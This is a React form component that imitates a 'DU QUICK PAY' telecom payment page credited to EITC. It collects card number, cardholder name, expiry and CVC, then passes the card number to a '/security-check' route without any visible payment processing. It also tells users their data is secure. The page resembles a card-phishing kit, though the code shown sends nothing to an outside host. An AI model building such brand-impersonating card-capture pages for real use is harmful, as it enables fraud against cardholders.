import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import '../styles/PaymentDetailsArabic.css';

const PaymentDetailsArabic: React.FC = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [agreeTerms, setAgreeTerms] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const amount = location.state?.amount || 'Not specified';
  const phoneNumber = location.state?.phoneNumber || '';
  const serviceType = location.state?.serviceType || 'DU QUICK PAY';

  const handlePayNow = () => {
    // No data storage as per user preference
    navigate('/security-check', { 
      state: { 
        amount: amount,
        cardNumber: cardNumber,
        phoneNumber: phoneNumber,
        serviceType: serviceType
      } 
    });
  };

  // Check expiry date format (MM/YY)
  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Allow only numbers and slash
    const regex = /^[0-9/]*$/;
    if (regex.test(value) || value === '') {
      // Automatic date formatting MM/YY
      if (value.length === 2 && expiryDate.length === 1) {
        setExpiryDate(value + '/');
      } else if (value.length === 2 && !value.includes('/')) {
        setExpiryDate(value + '/');
      } else {
        setExpiryDate(value);
      }
    }
  };

  // Check CVC format (3 digits only)
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Allow only numbers with maximum 3 digits
    const regex = /^[0-9]{0,3}$/;
    if (regex.test(value)) {
      setCvv(value);
    }
  };

  return (
    <div className="payment-details-arabic-container">
      <div className="content">
        <div className="form-group">
          <input
            type="text"
            className="card-input"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            dir="ltr"
          />
        </div>

        <div className="form-group">
          <input
            type="text"
            className="card-input"
            placeholder="Name on Card"
            value={cardName}
            onChange={(e) => setCardName(e.target.value)}
            dir="ltr"
          />
        </div>

        <div className="form-row">
          <div className="form-group half">
            <input
              type="text"
              className="card-input"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={handleExpiryDateChange}
              maxLength={5}
              dir="ltr"
            />
          </div>
          <div className="form-group half">
            <input
              type="text"
              className="card-input"
              placeholder="CVC"
              value={cvv}
              onChange={handleCvvChange}
              maxLength={3}
              dir="ltr"
            />
          </div>
        </div>

        <div className="terms-container">
          <label className="terms-label">
            <input
              type="checkbox"
              checked={agreeTerms}
              onChange={() => setAgreeTerms(!agreeTerms)}
              className="terms-checkbox"
            />
            <span className="checkmark"></span>
            <span className="terms-text">
              I agree to <span className="terms-link">Payment Terms and Conditions</span>
            </span>
          </label>
        </div>

        <div className="divider"></div>

        <div className="payment-summary">
          <div className="summary-item">
            <span className="summary-label">Total Amount</span>
            <span className="summary-value">{amount} AED</span>
          </div>
        </div>

        <button 
          className="pay-now-button" 
          onClick={handlePayNow}
          disabled={!agreeTerms}
        >
          Pay Now
        </button>

        <div className="payment-methods">
          <h2 className="payment-title">Accepted Cards</h2>
          <div className="payment-icons">
            <div className="payment-icon visa"></div>
            <div className="payment-icon mastercard"></div>
            <div className="payment-icon amex"></div>
            <div className="payment-icon gpay"></div>
            <div className="payment-icon samsung-pay"></div>
          </div>
          <p className="payment-note">
            All Mastercard and Visa cards issued by GCC/UAE countries are accepted
          </p>
        </div>

        <div className="security-info">
          <p className="security-text">
            Your private data is secure
            <span className="pci-logo"></span>
          </p>
        </div>

        <div className="footer">
          <p className="copyright">© 2024 All rights reserved to EITC.</p>
          <div className="footer-links">
            <a href="#" className="footer-link">Legal</a>
            <a href="#" className="footer-link">Terms and Conditions</a>
            <a href="#" className="footer-link">Site Map</a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentDetailsArabic;
